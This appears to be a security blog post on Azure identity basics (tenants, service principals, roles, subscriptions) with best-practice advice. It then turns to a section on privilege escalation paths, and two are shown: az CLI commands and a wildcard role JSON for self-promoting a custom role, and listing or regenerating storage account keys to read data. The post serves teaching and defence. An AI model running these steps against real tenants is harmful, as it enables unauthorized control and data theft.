@@ -1,0 +1,368 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Azure Security | ouhboy</title><meta name="author" content="malw0re"><meta name="copyright" content="malw0re"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Before we do anything else, let’s start at the absolute beginning with Identity. EntraID Identity Basics🪪 Tenant – Your Identity and Trust Boundary in Entra IDIn Microsoft Entra ID, a tenant is the d">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Azure Security">
+<meta property="og:url" content="https://malw0re.github.io/ouhboy/2026/01/18/Azure/index.html">
+<meta property="og:site_name" content="ouhboy">
+<meta property="og:description" content="Before we do anything else, let’s start at the absolute beginning with Identity. EntraID Identity Basics🪪 Tenant – Your Identity and Trust Boundary in Entra IDIn Microsoft Entra ID, a tenant is the d">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://malw0re.github.io/ouhboy/images/azure.jpeg">
+<meta property="article:published_time" content="2026-01-18T09:44:04.000Z">
+<meta property="article:modified_time" content="2026-02-01T00:16:37.097Z">
+<meta property="article:author" content="malw0re">
+<meta property="article:tag" content="Azure">
+<meta property="article:tag" content="Cloud">
+<meta property="article:tag" content="CloudSecurity">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://malw0re.github.io/ouhboy/images/azure.jpeg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Azure Security",
+  "url": "https://malw0re.github.io/ouhboy/2026/01/18/Azure/",
+  "image": "https://malw0re.github.io/ouhboy/images/azure.jpeg",
+  "datePublished": "2026-01-18T09:44:04.000Z",
+  "dateModified": "2026-02-01T00:16:37.097Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "malw0re",
+      "url": "https://malw0re.github.io/ouhboy"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/ouhboy/img/favicon.png"><link rel="canonical" href="https://malw0re.github.io/ouhboy/2026/01/18/Azure/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/ouhboy/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/ouhboy/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: true,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Azure Security',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/ouhboy/images/cyber.png" onerror="this.onerror=null;this.src='/ouhboy/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/ouhboy/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/ouhboy/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/ouhboy/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/ouhboy/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/writeups/"><i class="fa-fw fas fa-archive"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/research/"><i class="fa-fw fas fa-flask"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/ouhboy/images/cyberpunk-red.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/ouhboy/"><span class="site-name">ouhboy</span></a><a class="nav-page-title" href="/ouhboy/"><span class="site-name">Azure Security</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/ouhboy/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/writeups/"><i class="fa-fw fas fa-archive"></i><span> Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/categories/research/"><i class="fa-fw fas fa-flask"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/ouhboy/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Azure Security</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-18T09:44:04.000Z" title="Created 2026-01-18 12:44:04">2026-01-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-01T00:16:37.097Z" title="Updated 2026-02-01 03:16:37">2026-02-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/ouhboy/categories/research/">research</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Before we do anything else, let’s start at the absolute beginning with Identity.</p>
+<h1 id="EntraID-Identity-Basics"><a href="#EntraID-Identity-Basics" class="headerlink" title="EntraID Identity Basics"></a><strong>EntraID Identity Basics</strong></h1><h2 id="🪪-Tenant-–-Your-Identity-and-Trust-Boundary-in-Entra-ID"><a href="#🪪-Tenant-–-Your-Identity-and-Trust-Boundary-in-Entra-ID" class="headerlink" title="🪪 Tenant – Your Identity and Trust Boundary in Entra ID"></a><strong>🪪 Tenant – Your Identity and Trust Boundary in Entra ID</strong></h2><p>In Microsoft Entra ID, a tenant is the dedicated, isolated instance of Microsoft’s identity and access management service for your organization. It represents your organization’s trust boundary, containing your users, groups, applications, and service principals, along with all associated identity and security configurations.</p>
+<p>Each tenant is tied to a single Entra ID directory and is uniquely identified by a tenant ID (GUID) and a primary domain name (e.g., contoso.onmicrosoft.com). Tenants define who can authenticate and access resources and what those identities are allowed to do across Azure, Microsoft 365, and custom applications.</p>
+<p>Tenants are completely isolated from one another. Subscriptions, management groups, and resource groups, which are logical abstractions where resources like VMs are going to run in Azure, must be associated with one tenant, and cannot span multiple tenants without explicit cross-tenant configuration (e.g., B2B collaboration, cross-tenant access settings, or guest users).</p>
+<p><strong>Security Best Practice:</strong> Treat the tenant as your core security perimeter. Secure it with MFA, Conditional Access, Privileged Identity Management (PIM), and Identity Protection. Limit global administrators, audit tenant-wide settings regularly, and monitor external access to reduce the risk of identity-based attacks.</p>
+<h2 id="👤-User-–-Your-Digital-Identity-in-Entra-ID"><a href="#👤-User-–-Your-Digital-Identity-in-Entra-ID" class="headerlink" title="👤 User – Your Digital Identity in Entra ID"></a><strong>👤 User – Your Digital Identity in Entra ID</strong></h2><p>In Microsoft Entra ID, a user is the directory object that embodies an individual’s presence in the cloud, carrying the attributes that follow that person into Outlook, Teams, SharePoint, Azure resources, and any custom application that trusts the same directory for sign-in. A user record captures personal details such as display name, job title, and contact information, but its true anchor is the immutable Object ID, a GUID that never changes even if the visible account name is altered.</p>
+<p>Each user authenticates with one or more sign-in names, the most common being a User Principal Name. Credentials behind that name, whether a password, FIDO2 security key, Windows Hello biometrics, or the Microsoft Authenticator app, prove to Entra ID that the person is who they claim to be. The account itself lives in a single “home” tenant, yet the same individual can appear in other tenants as a guest; in that scenario, the inviting tenant creates a lightweight guest object that references the original home tenant for authentication, allowing cross-organization collaboration without sharing passwords.</p>
+<p>Because every access token issued to Microsoft 365 or Azure ultimately traces back to a user object, the directory treats that object as the essential key to resources. Permissions flow from Azure RBAC roles, Microsoft 365 roles, and application-specific roles that target the user’s Object ID. Audit logs, conditional-access evaluations, and identity-protection risk detections all hinge on that same identifier, ensuring a consistent security story even as users move between departments, devices, and locations.</p>
+<p><strong>Security Best Practice:</strong> Protect user accounts with strong, adaptive controls, enforce multifactor or passwordless sign-in for everyone, apply Conditional Access to challenge risky logins, use Privileged Identity Management to make admin roles time-bound and auditable, disable dormant accounts swiftly, and monitor sign-in logs for anomalies to keep each user object a trusted gateway rather than a potential breach point.</p>
+<h2 id="👥-Group-–-The-Permission-Bundle-in-Entra-ID"><a href="#👥-Group-–-The-Permission-Bundle-in-Entra-ID" class="headerlink" title="👥 Group – The Permission Bundle in Entra ID"></a><strong>👥 Group – The Permission Bundle in Entra ID</strong></h2><p>Within Microsoft Entra ID, a group is a single object that stands in for many identities, letting you hand out permissions once and have them flow automatically to every member. Groups come in two flavours: a Security group exists purely for access control and is understood by Azure role-based access, file shares, line-of-business apps, and anything else that reads directory security tokens; a Microsoft 365 group adds collaboration extras, a shared mailbox, calendar, Planner board, OneDrive, and SharePoint team site, so the same membership list governs both access and teamwork tools.</p>
+<p>In Entra ID, group membership comes in two flavors. Assigned groups are hand-picked — you manually add or remove each member. Dynamic groups are rule-driven — you define attribute-based rules, and the directory automatically adds or removes users whenever their attributes match or stop matching those rules.</p>
+<p><strong>Security Best Practice:</strong> Treat groups as the levers of least privilege, grant access to the group instead of to individuals, keep high-impact groups small and protected by multifactor and Privileged Identity Management, review membership regularly, and prefer dynamic rules where possible so access moves with the person’s role rather than lingering after their job changes.</p>
+<h2 id="💼-Service-Principal-–-The-Non-Human-Identity-in-Entra-ID"><a href="#💼-Service-Principal-–-The-Non-Human-Identity-in-Entra-ID" class="headerlink" title="💼 Service Principal – The Non-Human Identity in Entra ID"></a><strong>💼 Service Principal – The Non-Human Identity in Entra ID</strong></h2><p>In Microsoft Entra ID, a service principal is the application-shaped identity you grant to code and automation rather than to people. It is created automatically when you register or enterprise-consent to an application, and it lives as its own object inside one tenant with an immutable object ID that authorization rules can target. Because a service principal can be added to Azure roles, Azure AD roles, or custom app roles, it acts as the doorway through which the app performs actions such as deploying resources, querying data, or sending mail.</p>
+<p>A service principal supports three direct sign-in methods. The simplest is a client secret, essentially a long password stored in the directory and supplied by the application at token time. A stronger option is an asymmetric key pair, where the private key in a certificate proves the app’s identity while the public key is kept in the directory. The modern, secret-less approach is a federated credential that lets Entra ID trust a third-party token issuer—GitHub Actions, Kubernetes, or any OpenID Connect-compatible platform—so the calling workload never stores credentials at all. None of these sign-ins can prompt for multifactor authentication, so protecting the credentials themselves and tightly scoping the permissions of the service principal are critical. Any user granted owner on the application object can create or roll over secrets and certificates, effectively changing the app’s password at will.</p>
+<p><strong>Security best practice:</strong> prefer certificates or federated credentials over plain secrets, rotate them on a schedule you can prove, confine the principal to the minimum roles required, and switch to managed identities where possible so the platform handles tokens on your behalf. Constantly watch sign-in logs for unexpected locations or usage spikes, and review role assignments the same way you audit human administrators, because once a service principal is compromised it can act at machine speed without the friction of MFA.</p>
+<h2 id="🧑‍💼-Managed-Identity-–-Credential-Free-Access-for-Azure-Workloads"><a href="#🧑‍💼-Managed-Identity-–-Credential-Free-Access-for-Azure-Workloads" class="headerlink" title="🧑‍💼 Managed Identity – Credential-Free Access for Azure Workloads"></a><strong>🧑‍💼 Managed Identity – Credential-Free Access for Azure Workloads</strong></h2><p>A managed identity is Azure’s built-in way to let code sign in as a service principal without you ever handling a password or certificate. The moment you switch it on, Entra ID silently creates or attaches a service principal inside your tenant and registers it among the Enterprise Applications, but no secret material is exposed. Your workload pulls a token straight from the local metadata endpoint, and Entra ID trusts that call because the platform itself is making it.</p>
+<p>There are two flavours. A system-assigned identity is welded to a single resource instance and disappears when that resource is deleted, whereas a user-assigned identity is created once and can be bound to many resources for consistent RBAC assignments. In both cases, the identity has no long-lived credentials to leak or rotate; token issuance is handled on demand, so the usual burden of secret storage, expiry, and renewal simply vanishes. By granting the managed identity only the Azure roles it needs, you give your application just enough authority to do its job and nothing more, all without ever writing a credential into code or configuration.</p>
+<p><strong>Security Best Practice:</strong> Use a managed identity whenever you can. Grant just the roles it needs and regularly audit both the role list and sign-in logs for anything unusual.</p>
+<h2 id="📑-Role-–-Scoped-Admin-Authority-in-Entra-ID"><a href="#📑-Role-–-Scoped-Admin-Authority-in-Entra-ID" class="headerlink" title="📑 Role – Scoped Admin Authority in Entra ID"></a><strong>📑 Role – Scoped Admin Authority in Entra ID</strong></h2><p>In Microsoft Entra ID, a <em>role</em> is a built-in bundle of directory permissions that you can attach to a user, group, or service principal so they can manage specific features without inheriting blanket control over the tenant. Each role’s exact capabilities are predefined and documented, letting you see at a glance whether it can reset passwords, edit conditional-access policies, or assign licenses. At the very top sits Global Administrator, the all-powerful role whose holders can change any setting, elevate other accounts, or even lock down the whole directory; every other assignment, from User Administrator to Conditional Access Administrator, offers a narrower slice of authority to keep day-to-day tasks in check.</p>
+<p><strong>Security Best Practice:</strong> Keep Global Administrator seats to an absolute minimum, make every admin role time-bound and approval-based with Privileged Identity Management, and review role assignments regularly so only the right people, and no unattended service principals—hold the keys they truly need.</p>
+<h2 id="🗺️-App-Registration-–-The-Blueprint-of-Your-Application-in-Entra-ID"><a href="#🗺️-App-Registration-–-The-Blueprint-of-Your-Application-in-Entra-ID" class="headerlink" title="🗺️ App Registration – The Blueprint of Your Application in Entra ID"></a><strong>🗺️ App Registration – The Blueprint of Your Application in Entra ID</strong></h2><p>An app registration is the authoritative record of an application in Microsoft Entra ID. Creating it assigns a unique Application ID (client ID), records the redirect URIs where Entra ID will send tokens after authentication, and notes which OAuth 2.0 or OpenID Connect flows the app accepts. Inside the same record you decide how the app proves who it is: you can generate a client secret, upload a certificate, or configure a federated credential so a trusted issuer such as GitHub Actions can obtain tokens on the app’s behalf without any stored secret. The registration also lists every API and permission scope the app may call, forming the consent surface administrators see.</p>
+<p>Whenever the registration is created, or tenant-wide consent is granted, Entra ID automatically spins up a service principal in the tenant. That runtime identity can be placed in Azure RBAC or directory roles, appears in sign-in logs, and is what code actually uses when it requests tokens.</p>
+<p><strong>Security Best Practice:</strong> Guard credentials like privileged secrets, rotate them on a predictable schedule, prefer federated credentials to eliminate stored secrets, restrict API permissions to the bare minimum, and regularly review both permissions and role assignments.</p>
+<h1 id="Azure-Identity-Basics"><a href="#Azure-Identity-Basics" class="headerlink" title="Azure Identity Basics"></a><strong>Azure Identity Basics</strong></h1><h2 id="🧱-Management-Groups-–-Your-Strategic-Governance-Boundary"><a href="#🧱-Management-Groups-–-Your-Strategic-Governance-Boundary" class="headerlink" title="🧱 Management Groups – Your Strategic Governance Boundary"></a><strong>🧱 Management Groups – Your Strategic Governance Boundary</strong></h2><p>Azure Management Groups are hierarchical containers used to centrally manage access, policies, and compliance across multiple subscriptions in a scalable way. They enable governance via Azure Policy, RBAC, and Blueprints, which cascade automatically to all child subscriptions and groups.</p>
+<ul>
+<li>They form a tree structure up to 6 levels deep (excluding root and subscriptions).</li>
+<li>A single Entra ID (Azure AD) tenant can have up to 10,000 management groups, with one immutable root group at the top.</li>
+<li>Each group or subscription has only one parent and must be in the same Entra ID tenant.</li>
+<li>Management groups do not grant direct access to resources but define administrative boundaries.</li>
+<li>Misconfigurations at this level can impact all child subscriptions, making proper governance crucial.</li>
+</ul>
+<p><strong>Best Practice:</strong> Build a clear hierarchy (e.g., Corp, Dev, Prod, Security, Compliance) and apply controls at the highest appropriate level to enforce consistency and reduce misconfiguration risks.</p>
+<h2 id="📚-Subscriptions-–-Your-Primary-Security-Boundary"><a href="#📚-Subscriptions-–-Your-Primary-Security-Boundary" class="headerlink" title="📚 Subscriptions – Your Primary Security Boundary"></a><strong>📚 Subscriptions – Your Primary Security Boundary</strong></h2><p>An Azure subscription is the primary organizational unit and security boundary, encapsulating resources, billing, and an RBAC scope. By default, resources are isolated within a subscription. Cross-subscription access requires explicit setup (e.g., VNet peering, Private Link, or role assignments).</p>
+<ul>
+<li>Every customer must have at least one subscription to deploy workloads.</li>
+<li>Organizations often use multiple subscriptions to separate costs, environments, or access controls.</li>
+<li>A subscription has only one parent (a management group) and cannot contain other subscriptions.</li>
+<li>It is linked to one Entra ID tenant, and permissions applied at the subscription or its parent are inherited by all resources.</li>
+</ul>
+<p><strong>Best Practice:</strong> Use separate subscriptions for dev, staging, prod, logging, and security tooling to limit blast radius, strengthen isolation, and clarify billing.</p>
+<h2 id="🧠-Resource-Groups-–-Your-Logical-Resource-Boundary"><a href="#🧠-Resource-Groups-–-Your-Logical-Resource-Boundary" class="headerlink" title="🧠 Resource Groups – Your Logical Resource Boundary"></a><strong>🧠 Resource Groups – Your Logical Resource Boundary</strong></h2><p>An Azure resource group is a logical container used to organize and manage related resources (e.g., VMs, databases, functions) by project, department, environment, or billing. It enables unified actions like deployment, monitoring, and RBAC.</p>
+<ul>
+<li>Every resource must belong to exactly one resource group, and each group belongs to one subscription.</li>
+<li>Resource groups are flat (non-hierarchical), cannot nest, and do not organize subscriptions or management groups.</li>
+<li>Permissions set on a group are inherited by all contained resources.</li>
+<li>Deleting a resource group deletes all its resources, making tagging and governance critical.</li>
+</ul>
+<p><strong>Best Practice:</strong> Group resources by application, workload, or lifecycle, apply policies and roles at the group level, and avoid mixing unrelated resources to reduce risk and simplify management.</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://images.coursestack.com/e0cb94d8-532a-4658-bfdd-5400224f2414/c8e4ffc8-8d80-41af-91bb-9eb93b04b561"></a></p>
+<h2 id="Over-Privilege-Azure’s-Silent-Breach-Vector"><a href="#Over-Privilege-Azure’s-Silent-Breach-Vector" class="headerlink" title="Over-Privilege: Azure’s Silent Breach Vector"></a><strong>Over-Privilege: Azure’s Silent Breach Vector</strong></h2><ul>
+<li><strong>Contributor copy-paste autopilot</strong>: you search “upload to Blob Storage,” lift the first az role assignment snippet you see, <code>az role assignment create --role Contributor</code>—paste, deploy, walk away. Three releases later, that tiny function app can also spin up VMs, delete Key Vault secrets, and nuke Cosmos DB containers, yet nobody remembers who typed the command.</li>
+<li><strong>Portal quick-start seduction</strong>: the Azure Marketplace blade promises a fully working demo in sixty seconds. It succeeds because the publisher’s ARM template quietly grabs Owner on the entire subscription. You swear you’ll tighten the scope after the proof-of-concept. Spoiler: you won’t.</li>
+<li><strong>Default identity landmine</strong>: an App Service or VM comes alive with its system-assigned managed identity pre-granted Contributor on the subscription. One RCE exploit later, the attacker is free to reconfigure networks, create additional principals, and pivot across regions, all without hunting for credentials.</li>
+<li><strong>Keys that outlive the sprint</strong>: a client secret baked into an Azure DevOps variable sticks around long after the original engineer leaves. GitHub’s secret scanner eventually flags it, and so will someone trawling public repos. A single leaked GUID and secret value equals full API access under that service principal’s role set.</li>
+</ul>
+<p>In Azure, one over-powered role assignment or forgotten secret can cascade into subscription-wide, or tenant-wide, compromise. Treat permission hygiene as routine ops: let Azure Advisor surface idle role assignments, run Access Reviews and Privileged Identity Management to shrink standing access, and schedule a weekly Azure Resource Graph diff to spot drift. Keep your least-privilege map alive, flag any deviation the moment it appears, and slam the brakes before curious code turns into headline-grade breach.</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://images.coursestack.com/e0cb94d8-532a-4658-bfdd-5400224f2414/6fa823f8-ab99-4259-b7d6-79e4b7c9794e"></a></p>
+<h1 id="Three-Practical-Privilege-Escalation-Paths-Azure-Edition"><a href="#Three-Practical-Privilege-Escalation-Paths-Azure-Edition" class="headerlink" title="Three Practical Privilege Escalation Paths - Azure Edition"></a><strong>Three Practical Privilege Escalation Paths - Azure Edition</strong></h1><h2 id="1-roleDefinitions-Self-Promotion"><a href="#1-roleDefinitions-Self-Promotion" class="headerlink" title="1. roleDefinitions Self-Promotion"></a><strong>1. roleDefinitions Self-Promotion</strong></h2><p><strong>Minimal permission:</strong> <code>Microsoft.Authorization/roleDefinitions/write</code></p>
+<p><strong>Goal:</strong> Silently upgrade a custom role you already hold giving it further privileges</p>
+<p><strong>Attack breakdown</strong></p>
+<ol>
+<li><strong>Identify yourself</strong> – <code>az account show</code> reveals your objectId, <code>az role assignment list --assignee &lt;objectId&gt;</code> shows any custom role already bound to you.</li>
+<li><strong>Fetch the role definition</strong> – <code>az role definition list --name &quot;UploaderRole&quot; &gt; role.json</code> saves the current JSON.</li>
+<li><strong>Add permissions</strong> – edit <code>role.json</code> so the <code>&quot;Actions&quot;</code> block reads:</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">`&#123;`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;roleName&quot;</span>: <span class="string">&quot;&lt;name of the role&gt;&quot;</span>,`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;Name&quot;</span>: <span class="string">&quot;&lt;name of the role&gt;&quot;</span>,`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;IsCustom&quot;</span>: <span class="literal">true</span>,`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;Description&quot;</span>: <span class="string">&quot;Custom role with elevated privileges&quot;</span>,`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;Actions&quot;</span>: [<span class="string">&quot;*&quot;</span>],`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;NotActions&quot;</span>: [],`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;DataActions&quot;</span>: [<span class="string">&quot;*&quot;</span>],`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;NotDataActions&quot;</span>: [],`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;AssignableScopes&quot;</span>: [<span class="string">&quot;/subscriptions/&lt;subscription-id&gt;&quot;</span>],`</span><br><span class="line"></span><br><span class="line">`<span class="string">&quot;id&quot;</span>: <span class="string">&quot;/subscriptions/&lt;subscription-id&gt;/providers/Microsoft.Authorization/roleDefinitions/&lt;role-id&gt;&quot;</span>,`</span><br><span class="line"></span><br><span class="line">`&#125;`</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>Push it back</strong> – <code>az role definition update --role-definition role.json</code> writes the change; every existing assignment of that role (including your own) now grants unrestricted access across the scope.</li>
+<li><strong>Refresh token</strong> – run <code>az account get-access-token</code> or simply re-authenticate so the expanded rights flow into your credential. One quiet role tweak has turned limited access into full subscription control.</li>
+</ol>
+<p><em>A single <code>roleDefinitions/write</code> call followed by a token refresh turns a low-tier identity into full subscription dominance.</em></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/az-authorization-privesc.html#microsoftauthorizationroledefinitionswrite"><em>More on HackTricks</em></a></p>
+<h2 id="2-storageAccounts-Key-Grab"><a href="#2-storageAccounts-Key-Grab" class="headerlink" title="2. storageAccounts Key Grab"></a><strong>2. <em>storageAccounts Key Grab</em></strong></h2><p><strong>Minimal permission:</strong> <code>*Microsoft.Storage/storageAccounts/listkeys/action</code> (or <code>Microsoft.Storage/storageAccounts/regenerateKey/action</code>)*</p>
+<p><strong>Goal:</strong> harvest or mint storage-account access keys and ride them to full control over the data plane</p>
+<p><strong>Attack breakdown</strong></p>
+<ol>
+<li><strong>Identify the target</strong> – <code>az storage account show --name &lt;acc-name&gt;</code> confirms the resource exists and shows its region.</li>
+<li><strong>List keys (</strong><code>*Microsoft.Storage/storageAccounts/listkeys/action*</code><strong>)</strong> – <code>az storage account keys list --account-name &lt;acc-name&gt;</code> returns both key1 and key2 in plaintext; either key lets you authenticate as the account for Blob, Queue, Table, and File operations.</li>
+<li><strong>Regenerate keys (</strong><code>*Microsoft.Storage/storageAccounts/regenerateKey/action*</code><strong>)</strong> – <code>az storage account keys renew --account-name &lt;acc-name&gt; --key key2</code> issues a fresh secret and, in the same response, hands you the brand-new key plus the untouched partner key, guaranteeing uninterrupted access.</li>
+<li><strong>Use the keys -</strong> Now we can use the keys to access the storage</li>
+</ol>
+<p><code>az storage blob list \</code></p>
+<ul>
+<li><code>-account-name &lt;acc-name&gt; \</code></li>
+<li><code>-account-key &lt;key1-or-key2&gt; \</code></li>
+<li><code>-container-name mycontainer</code></li>
+</ul>
+<p><em>A single <code>listkeys</code> (or <code>regenerateKey</code>) call puts every object in the storage account, and any service that trusts those keys, at your fingertips.</em></p>
